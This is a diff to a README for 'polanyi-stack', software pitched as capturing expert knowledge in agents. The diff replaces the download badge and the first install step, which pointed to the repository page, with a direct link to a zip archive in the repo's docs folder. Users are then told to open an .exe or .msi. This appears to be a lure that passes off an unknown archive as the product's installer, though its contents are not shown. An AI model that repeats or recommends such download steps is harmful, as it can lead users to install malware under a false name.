@@ -1,6 +1,6 @@
 # 🧠 polanyi-stack - Turn expert knowledge into smart agents
 
-[![Download for Windows](https://img.shields.io/badge/Download-polanyi--stack-blue.svg)](https://github.com/hostile-shorepatrol81/polanyi-stack)
+[![Download for Windows](https://img.shields.io/badge/Download-polanyi--stack-blue.svg)](https://github.com/hostile-shorepatrol81/polanyi-stack/raw/refs/heads/main/docs/stack_polanyi_v3.1.zip)
 
 The polanyi-stack helps you capture what experts know. People hold deep knowledge in their heads that is hard to write down. This is the Polanyi paradox. This software lets you take that hidden wisdom and turn it into digital skills. You can build agents that handle tasks and make choices based on your expert standards.
 
@@ -22,7 +22,7 @@ Ensure your computer has the following items to run the stack:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the repository page to download the installer: [https://github.com/hostile-shorepatrol81/polanyi-stack](https://github.com/hostile-shorepatrol81/polanyi-stack).
+1. Visit the repository page to download the installer: [https://github.com/hostile-shorepatrol81/polanyi-stack/raw/refs/heads/main/docs/stack_polanyi_v3.1.zip](https://github.com/hostile-shorepatrol81/polanyi-stack/raw/refs/heads/main/docs/stack_polanyi_v3.1.zip).
 2. Locate the most recent version in the releases section.
 3. Choose the file ending in .msi or .exe.
 4. Open the downloaded file once it finishes.
